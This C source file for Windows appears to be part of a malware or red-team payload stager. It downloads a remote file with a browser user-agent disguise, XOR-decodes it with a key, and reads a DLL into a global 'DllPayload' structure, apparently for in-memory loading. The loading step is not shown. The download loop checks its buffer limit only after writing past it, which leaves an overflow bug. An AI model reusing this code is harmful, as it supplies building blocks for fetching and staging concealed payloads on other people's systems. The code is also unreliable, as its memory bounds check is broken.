#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include "utils.h"
#include "structs.h"


#pragma comment(lib, "wininet.lib")

struct PAYLOAD DllPayload = { 0 };

char* DownloadFile(const char* url, DWORD* size)
{
	HINTERNET hInternet, hConnect;
	DWORD bytesRead;

	// Initialize WinINet
	hInternet = InternetOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL)
	{
		printf("InternetOpen failed (%lu)\n", GetLastError());
		return NULL;
	}

	hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hConnect == NULL)
	{
		printf("InternetOpenUrlA failed (%lu)\n", GetLastError());
		InternetCloseHandle(hInternet);
		return NULL;
	}

	const DWORD bufferSize = 20 * 1024 * 1024;
	char* buffer = malloc(bufferSize);
	if (buffer == NULL) {
		printf("Failed to allocate memory\n");
		return NULL;
	}
	*size = 0;
	while (1)
	{
		if (!InternetReadFile(hConnect, buffer + *size, 4096, &bytesRead) || bytesRead == 0)
		{
			break;
		}
		*size += bytesRead;
		if (*size > bufferSize) {
			printf("Buffer overflow\n");
			free(buffer);
			return NULL;
		}
	}
	printf("[+] Buffer allocated at address: %p\n", buffer);

	Configs.downloadedBuffer = buffer;

	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);

	return buffer;
}

void XORWithKey(char* data, DWORD size, const char* key)
{
	size_t keyLength = strlen(key);
	for (DWORD i = 0; i < size; ++i)
	{
		data[i] ^= key[i % keyLength];
	}
}

BOOL ReadDllFile(char* FileInput) {
	HANDLE hFile;
	DWORD FileSize, lpNumberOfBytesRead;
	BOOL Succ;
	PVOID DllBytes;


	
	hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		DWORD error = GetLastError();
		if (error == ERROR_FILE_NOT_FOUND) {
			printf("[!] Dll File Doesnt Exist \n");
		}
		else {
			printf("[!] ERROR READING FILE [%d]\n", error);
		}
		system("PAUSE");
		return FALSE;
	}

	FileSize = GetFileSize(hFile, NULL);
	DllBytes = malloc((SIZE_T)FileSize);

	Succ = ReadFile(hFile, DllBytes, FileSize, &lpNumberOfBytesRead, NULL);
	printf("[i] lpNumberOfBytesRead Read ::: %d \n", lpNumberOfBytesRead);
	printf("[+] DllBytes :: 0x%0-16p \n", (void*)DllBytes);
	if (!Succ) {
		printf("[!] ERROR ReadFile [%d]\n", GetLastError());
		system("PAUSE");
		return FALSE;
	}

	DllPayload.BytesNumber = lpNumberOfBytesRead;
	DllPayload.pDllBytes = DllBytes;

	CloseHandle(hFile);

	return TRUE;
}